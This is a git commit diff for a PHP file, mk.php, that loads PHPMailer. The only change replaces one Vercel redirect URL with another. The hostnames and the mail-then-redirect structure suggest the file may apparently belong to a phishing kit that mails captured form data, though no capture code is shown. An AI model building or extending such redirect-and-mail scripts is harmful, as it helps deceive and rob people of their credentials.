d68cb9a3b268e1a08b1a393688d36d13808258e0
adiwalfare <ronimawiads@gmail.com>
2025-07-15 17:27:20 +0500

    Update mk.php

--- mk.php
+++ mk.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://mk-pass.vercel.app/");
+header("Location: https://re-again-apply.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
